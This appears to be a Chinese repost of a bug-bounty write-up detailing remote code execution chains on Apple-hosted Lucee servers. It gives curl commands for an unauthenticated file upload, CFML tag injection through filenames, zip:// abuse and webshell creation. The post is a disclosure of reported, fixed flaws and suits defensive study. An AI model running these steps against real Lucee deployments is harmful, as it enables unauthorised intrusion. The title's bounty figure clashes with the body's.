> 原文链接: https://www.anquanke.com//post/id/231406 


# 我是如何入侵Apple并拿到40万赏金的（二）


                                阅读量   
                                **161435**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01f3b0479ceab44bb1.jpg)](https://p3.ssl.qhimg.com/t01f3b0479ceab44bb1.jpg)



上一篇文章中讲述了我是如何从0开始针对Apple的资产进行网站探测、CMS识别、代码审计、失败的入侵过程再到WAF绕过的分析，本篇承接上篇，讲述RCE利链的完整过程。



## facilities.apple.com上的远程代码执行

让我们先来看一下在 [https://facilities.apple.com](https://facilities.apple.com) 上利用 `imgProcess.cfm`和`admin.search.index.cfm`触发的RCE链。

目前我们已经控制了一个目录，既可以向其中复制文件（`dataDir`参数），也可以指定一个目录来从其中复制文件过去（`luceeArchiveZipPath`参数）。

此时如果可以在服务器上的某处创建一个名称为:

```
server.&lt;cffile action=write file=#Url['f']# output=#Url['content']#&gt;.cfm
```

内容为:

```
"#stText.x.f#"
```

的文件，则可以通过`luceeArchiveZipPath`将其路径传递给`admin.search.index.cfm`。

由于以下key:

```
server.&lt;cffile action=write file=#Url['f']# output=#Url['content']#&gt;.cfm
```

并不存在，那么将创建它并将其写入名为`searchindex.cfm`的文件中。

这意味着我们可以在使用`dataDir`参数来指定的任意目录中的`searchindex.cfm`文件中控制CFML标签（类似于PHP标签），这同时也意味着我们可以使用webroot路径在服务器上执行远程代码，达到RCE！

我们可以利用 `imgProcess.cfm` 在目标文件系统上创建一个文件：

```
server.&lt;cffile action=write file=#Url['f']# output=#Url['content']#&gt;.cfm
```

其内容与RegExp相匹配：

```
[''"##]stText\..+?[''"##]
```

这次攻击测试并不会触发WAF，因为我们在这里没有进行路径遍历。

### <a class="reference-link" name="%E8%8E%B7%E5%BE%97shell%E7%9A%84%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8%E9%93%BE%E6%AD%A5%E9%AA%A4"></a>获得shell的完整利用链步骤
- 首先创建一个文件名为`server.&lt;cffile action=write file=#Url['f']# output=#Url['content']#&gt;.cfm`，内容为 `"#stText.x.f#"`的文件（以匹配正则表达式），并将文件名进行URL编码，因为后端（tomcat）不支持某些字符
```
curl -X POST 'https://facilities.apple.com/lucee/admin/imgProcess.cfm?file=%2F%73%65%72%76%65%72%2e%3c%63%66%66%69%6c%65%20%61%63%74%69%6f%6e%3d%77%72%69%74%65%20%66%69%6c%65%3d%23%55%72%6c%5b%27%66%27%5d%23%20%6f%75%74%70%75%74%3d%23%55%72%6c%5b%27%63%6f%6e%74%65%6e%74%27%5d%23%3e%2e%63%66%6d' --data 'imgSrc="#stText.Buttons.save#"'
```
- 访问触发复制文件名函数以准备将要执行的代码
```
curl 'http://facilities.apple.com/lucee/admin/admin.search.index.cfm?dataDir=/full/path/lucee/context/rootxharsh/&amp;LUCEEARCHIVEZIPPATH=/full/path/lucee/temp/admin-ext-thumbnails/__/'
```
- 写shell最终触发代码执行
```
curl https://facilities.apple.com/lucee/rootxharsh/searchindex.cfm?f=PoC.cfm&amp;content=cfm_shell
```
<li>访问 webshell： `https://facilities.apple.com/lucee/rootxharsh/PoC.cfm`[![](https://p3.ssl.qhimg.com/t01a9e286d397544500.jpg)](https://p3.ssl.qhimg.com/t01a9e286d397544500.jpg)
</li>
这次攻击测试并不会触发WAF，因为我们在这里没有进行路径遍历。



## 另辟蹊径，其他主机的沦陷

由于`imgProcess.cfm`在较早的Lucee版本中不可用，因此我们必须找到其他方法才能在另外两台主机上获得RCE。我们发现了另一种巧妙的方法;）。

### <a class="reference-link" name="%E7%BB%95%E8%BF%87%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%EF%BC%8C%E4%B8%8A%E4%BC%A0.lex%E6%96%87%E4%BB%B6"></a>绕过身份验证，上传.lex文件

经过审计发现，`ext.applications.upload.cfm` 文件的部分功能代码没有严格的身份验证。该代码段非常简单，我们只需要通过`extfile`表单传递带有文件扩展名`.lex`的form参数，如果不这么做，前面已经解释过，我们将会收到后端返回的异常。

```
&lt;cfif not structKeyExists(form, "extfile") or form.extfile eq ""&gt;
    ...
&lt;/cfif&gt;
&lt;!--- try to upload (.zip and .re) ---&gt;
&lt;cftry&gt;
    &lt;cffile action="upload" filefield="extfile" destination="#GetTempDirectory()#"
    nameconflict="makeunique" /&gt;
    &lt;cfif cffile.serverfileext neq "lex"&gt;
        &lt;cfthrow message="Only .lex is allowed as extension!" /&gt;
    &lt;/cfif&gt;
    &lt;cfcatch&gt;
        ...
    &lt;/cfcatch&gt;
&lt;/cftry&gt;
&lt;cfset zipfile="#rereplace(cffile.serverdirectory, '[/\\]$', '')##server.separator.file##cffile.serverfile#"
/&gt;
```

针对`.lex`扩展名的处理，我们可以看到这段代码：

```
&lt;cfif cffile.serverfileext eq "lex"&gt;
    ... 
    type="#request.adminType#" 
    ...
&lt;/cfif&gt;
```

因为我们没有`request.admintype`，所以会触发异常。但是，但是，但是！！我们构造的恶意文件仍在触发之前就已经上传成功了，可以在这里确认：

[![](https://p2.ssl.qhimg.com/t0159bc01a8589a5540.jpg)](https://p2.ssl.qhimg.com/t0159bc01a8589a5540.jpg)

`.lex`文件不过是一种压缩文件格式，这实际上是Lucee的一种扩展名的格式，我们可以上传，并且后端不会针对其检查文件内容，因此我们可以将该文件设置为任何我们想要的内容。

### <a class="reference-link" name="Exploit%20%E4%B9%8B%E5%85%89"></a>Exploit 之光

通过对Lucee的审计和测试发掘 ，我们已经知道它允许使用诸如 `zip://`，`file:///`等协议（我们刚好在此利用链中使用了这些协议），因此我们可以在系统中文件功能完全受到控制的地方利用这些被允许的协议来做一些我们想要的东西（`luceeArchiveZipPath`）。

现在，我们可以利用 `ext.applications.upload.cfm` 来创建`.lex`压缩文件，其中将包含一个名称为：

```
server.&lt;cffile action=write file=#Url['f']# output=#Url['content']#&gt;.cfm
```

内容为：

```
"#stText.x.f#"
```

的文件。一旦我们将该zip格式的压缩文件保存在系统上，就可以在`luceeArchiveZipPath`变量中使用`zip://`协议来访问 `*.*.cfm`文件。

### <a class="reference-link" name="%E8%8E%B7%E5%8F%96%E5%8F%A6%E5%A4%96%E4%B8%A4%E5%8F%B0%E4%B8%BB%E6%9C%BA%E7%9A%84shell"></a>获取另外两台主机的shell
<li>1、创建一个文件名为`server.&lt;cffile action=write file=#Url['f']# output=#Url['content']#&gt;.cfm` ，内容为`"#stText.x.f#"` 的文件，并将其压缩为`payload.lex`
</li>
[![](https://p0.ssl.qhimg.com/t01c1d9be29aaccb55c.jpg)](https://p0.ssl.qhimg.com/t01c1d9be29aaccb55c.jpg)
- 2、利用未授权的上传点`ext.applications.upload.cfm`上传该 `.lex` 文件
```
curl -vv -F extfile=@payload.lex https://booktravel.apple.com/lucee/admin/ext.applications.upload.cfm
```
- 3、利用 `zip://` 协议触发
```
curl https://booktravel.apple.com/lucee/admin/admin.search.index.cfm?dataDir=/full/path/lucee/web/context/exploit/&amp;luceeArchiveZipPath=zip:///full/path/lucee/web/temp/payload.lex
```
<li>4、现在，我们的恶意文件<br>`server.&lt;cffile action=write file=#Url['f']# output=#Url['content']#&gt;.cfm`<br>
已作为文本字符串添加到了 `/&lt;lucee web&gt;/context/exploit/` 目录下的 `searchindex.cfm`文件里，<br>
我们可以通过以下方式访问它：
<pre><code class="hljs ruby">https://booktravel.apple.com/&lt;lucee root&gt;/exploit/searchindex.cfm
</code></pre>
5、 向 `https://booktravel.apple.com/lucee/exploit/searchindex.cfm?f=test.cfm&amp;output=cfml_shell` 发出请求将创建我们的 webshell
</li>
<li>创建成功，访问 webshell，并执行 id 命令：`https://booktravel.apple.com/lucee/exploit/test.cfm?cmd=id`
</li>
[![](https://p0.ssl.qhimg.com/t012171153e760916d4.jpg)](https://p0.ssl.qhimg.com/t012171153e760916d4.jpg)

由于有负载平衡，所以我们此处需要使用burp的Intruder功能来发现我们的shell命令执行结果。



## 获得赏金，收工回家

Apple方面迅速解决了该问题，但要求我们在他们修复之前不要披露此漏洞。对于这些漏洞，总共给了我们50,000+美元的奖励。

另一方面，我们和Apple、Lucee的团队进行了交流。Lucee团队通过限制直接访问cfm文件来修复该错误。目前我们仍在等待CVE的分配下发。
